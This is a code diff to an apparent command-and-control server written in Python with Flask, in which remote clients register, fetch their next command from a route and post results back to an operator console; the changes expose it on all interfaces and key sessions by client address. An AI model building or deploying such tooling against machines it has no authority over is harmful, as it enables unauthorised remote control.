@@ -44,6 +44,8 @@ class SessionServer():
     interacting with them via the command line.
     """
 
+    web_ip = "0.0.0.0"     # Host web server on this machine, with exposed port
+    web_port = 5000        # The port hosting the web server
     web_sessions = []      # All active web sessions
     web_timeout =  3       # The number of seconds we wait, before the session is classed as inactive
     running = True         # Allows us to stop threads when the user exits
@@ -63,7 +65,7 @@ class SessionServer():
         """
         print("Quitting...")
         self.running = False
-        os.kill(os.getpid(), signal.SIGTERM) # Hacky way of killing Flask
+        os.kill(os.getpid(), signal.SIGINT) # Hacky way of killing Flask
 
     # ================================= Session Handling =======================================
 
@@ -138,7 +140,7 @@ class SessionServer():
         print("\033[33m * WARNING: I am not liable for any damage (including criminal charges) which may arise from use of this software.")
         print(" * For more information see the LICENSE file included with this software.\033[0m")
 
-        print("\033[32m * Ready!\033[0m\n")
+        print("\033[32m * Hosting on port %d\033[0m\n" % self.web_port)
 
         vars = {"RHOST": None}
 
@@ -150,6 +152,7 @@ class SessionServer():
 
             if line[:4] in ("exit", "quit"):
                     self.stop()
+                    return
 
             parts = line.split()
             if len(parts) == 0: 
@@ -215,7 +218,7 @@ def index():
     """
     The website's index page.
     """
-    hostname = request.host.split(":")[0]
+    hostname = request.remote_addr
     session_server.register_new_session(hostname)
     with open("www/index.html", "r") as f:
         html = f.read()
@@ -227,7 +230,7 @@ def cmd():
     """
     The route that provides a client with its next command.
     """
-    hostname = request.host.split(":")[0]
+    hostname = request.remote_addr
     session_server.register_new_session(hostname)
     session_server.reset_timeout(hostname)
     cmd_ = session_server.get_next_command(hostname)
@@ -238,13 +241,13 @@ def result():
     """
     The route that clients send their response to.
     """
-    hostname = request.host.split(":")[0]
+    hostname = request.remote_addr
     session_server.register_new_session(hostname)
     session_server.reset_timeout(hostname)
     if "response" in request.form and request.form["response"] == "ALIVE":
         pass
     else:
-        print("{}: Status={}".format(request.host, request.form["status"]), end=("" if "response" in request.form else "\n"))
+        print("{}: Status={}".format(request.remote_addr, request.form["status"]), end=("" if "response" in request.form else "\n"))
         if "response" in request.form:
             print(", Response={}".format(request.form["response"]))
     
@@ -268,6 +271,4 @@ def print_banner():
     """)
                                                    
 print_banner()
-web_server.run()
-session_server.stop()
-print("Cleaning up...")
+web_server.run(host=session_server.web_ip, port=session_server.web_port)
